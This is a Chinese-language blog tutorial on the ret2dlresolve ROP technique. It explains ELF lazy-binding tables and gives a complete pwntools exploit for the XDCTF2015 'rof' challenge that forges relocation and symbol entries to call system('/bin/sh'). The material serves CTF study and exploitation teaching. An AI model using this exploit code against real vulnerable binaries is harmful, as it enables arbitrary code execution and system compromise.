# AdvanceROP-ret2dlresolve


首先要对延迟绑定机制做一个补充，即在延迟绑定中使用的表的名称和功能。

# ELF JMPREL Relocation Table

elf-rel函数重定位表，即ELF程序的.rel.plt段。该段结构的定义如下：

```c
Elf32_Rel       struc ; (sizeof=0x8, align=0x4, copyof_2)
00000000 r_offset        dd ?
00000004 r_info          dd ?
00000008 Elf32_Rel       ends
```

其中，r_offset是该函数的GOT表的虚拟地址，r_info是该函数在dynsym表中的下标。

那么如何通过dl_runtime_resolve获得该函数的Rel地址？dl_runtime_resolve的第一个参数为reloc_arg，而rel_plt_addr + reloc_arg的地址即为该函数的rel表地址。

# ELF Symbol Table

此表即dynsym表。存放着动态链接函数更多的信息，定义如下：

```c
Elf32_Sym       struc ; (sizeof=0x10, align=0x4, mappedto_1)
00000000 st_name         dd ?                    
00000004 st_value        dd ?                    
00000008 st_size         dd ?
0000000C st_info         db ?
0000000D st_other        db ?
0000000E st_shndx        dw ?
00000010 Elf32_Sym       ends
```

这里我们关心几点：1、一个ELF32_Sym结构的大小是16，这个将方便我们之后的伪造。2、st_name为该函数名字符串在dynstr表中的偏移。3、st_value应该是该函数相对于libc的偏移地址。（不确定，也不需要用）

这里我们只需要知道GOT表的重写过程是根据st_name来进行的，我们之后仅需要伪造st_name即可。

# ELF String Table

此表仅存放函数名（字符串），偏移是dynsym表中的st_name。无结构，大致内容如下：

![image-20231103160922604](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231103160922604.png)

以上的三个表均存放在link_map中，而link_map存放在got+4的位置。dl_runtime_resolve的位置在got+8。link_map会在plt[0]中被压入栈中，然后跳转至dl_runtime_resolve函数的位置执行。

# 伪造思路

由于GOT表重写过程对函数的定位均是通过偏移进行的。这里我们不妨让这个偏移更大一点，大到最后的计算出的实际地址是我们可以控制的地址。然后我们在这个地址上分别写入该函数的.rel.plt表、.dynsym表和.dynstr表为我们想要的函数，那么就可以在plt[0]（也就是延迟绑定的过程中）执行任意函数。

由于构造所需的空间较大，这里我们的思路如下：

- 首先将payload读入伪造栈的位置（一般是bss段的位置）
- 然后将栈迁移至伪造栈的位置执行即可。

迁移栈很简单，我们现在需要知道栈该如何构造才行。这里为了执行system函数，构造栈如下：

![img](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/1698998597486-c432e1a6-814b-4d40-9ff1-916090e7544b.png)

然后，我们使用read函数，将上面构造的栈写入bss位置，并进行栈迁移即可。

# 模板

详细解释看注释

```python
from pwn import *

context(arch='i386',os='linux')
context.terminal = ['tmux','splitw','-h']

elf = ELF('./rof')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')

r = elf.process()

read_plt = elf.sym['read']
write_plt = elf.sym['write']

ppp_ret = 0x08049351    # pop esi ; pop edi ; pop ebp ; ret
pop_ebp_ret = 0x08049353
leave_ret = 0x08049165

stack_size = 0x800
bss_addr = 0x804c028    # readelf -S rof | grep .bss
base_stage = bss_addr + stack_size

r.recvuntil(b'Welcome to XDCTF2015~!\n')

payload = b'a' * 112
payload += p32(read_plt)
payload += p32(ppp_ret)	# 弹出下面3个栈单位
payload += p32(0)
payload += p32(base_stage)	# 栈迁移的位置
payload += p32(100)	#总共100个字节，下面也得填充到100个字节
payload += p32(pop_ebp_ret)	# 移动ebp至base_stage
payload += p32(base_stage)
payload += p32(leave_ret)	#迁移栈顶，开始执行base+stage + 4位置的代码
r.send(payload)

# fake dynsym （base_stage + 36）
dynsym = 0x8048248
dynstr = 0x80482e8
fake_dynsym = base_stage + 36   # 36 = 4 * 9
alg = 0x10 - ((fake_dynsym - dynsym) & 0xf)   # 两者的差可以被0x10整除，因为一个ELF32Sym的大小为固定的0x10，而且需要使用下标定位每个函数的sym
fake_dynsym = fake_dynsym + alg # 0x10对齐
sym_index = (fake_dynsym - dynsym) // 0x10  # 计算dynsym[sym_index]
r_info = (sym_index << 8) | 0x7 # 根据ELF32_R_SYM(info) ((info)>>8) 反推出.rel.plt中的r_info，其中最低为必须为7   
st_name = (fake_dynsym + 0x10) - dynstr  # func_name = *(dynstr + st_name) 伪造的st_name就放在fake_sym的后面，而fake_sym的大小是4 * 4 = 16, 所以st_name = （fake_dynsym + 0x10） - dynstr
fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)   # 伪造write函数的符号表，按照结构体的规定，该内容将被填入base_stage+36的部位

# fake .rel.plt （base_stage + 28）
plt_0 = 0x8049030   # push link_map;jmp dl_runtime_resolve
rel_plt = 0x80483a0
fake_rel_plt = base_stage + 28  # 28 = 4 * 7
fake_reloc = fake_rel_plt - rel_plt # rel_plt + fake_reloc -> base_stage + 28 -> fake_rel_plt
r_offset = elf.got['write']
# r_info 已经计算完毕
fake_rel = p32(r_offset) + p32(r_info)  # 伪造write函数.rel.plt内容

# 调用过程：
# .rel.plt + reloc_arg -> write_rel_plt (r_offset r_info)
# dynsym[(r_info) >> 8] -> write_sym (st_name st_value)
# dynstr[st_name] = 'write'
bin_sh = b'/bin/sh\x00'

payload = b'AAAA'
payload += p32(plt_0)   # push link_map;jmp dl_runtime_resolve
payload += p32(fake_reloc)  # reloc_arg
payload += p32(0xdead)    # retn addr
payload += p32(base_stage + 80)   # system arg 
payload += b'AAAA' # base_stage + 20
payload += b'AAAA' # base_stage + 24
payload += fake_rel # fake .rel.plt base_stage + 28 (8 bytes)
payload += alg * b'A'   # base_stage + 36
payload += fake_sym # fake .dynsym base_stage + 36 + algin (16 bytes)
payload += b'system\x00' # fake st_name base_stage + 36 + algin + 0x10 (6 bytes)
payload += b'A' * (80 - len(payload))
payload += bin_sh   # base_stage + 80
payload += b'A' * (100 - len(payload))  # read(0,base_stage,100)

r.send(payload)
r.interactive()
```


---

> 作者: alextang  
> URL: https://alextang.top/articles/2023/11/advancerop-ret2dlresolve/  

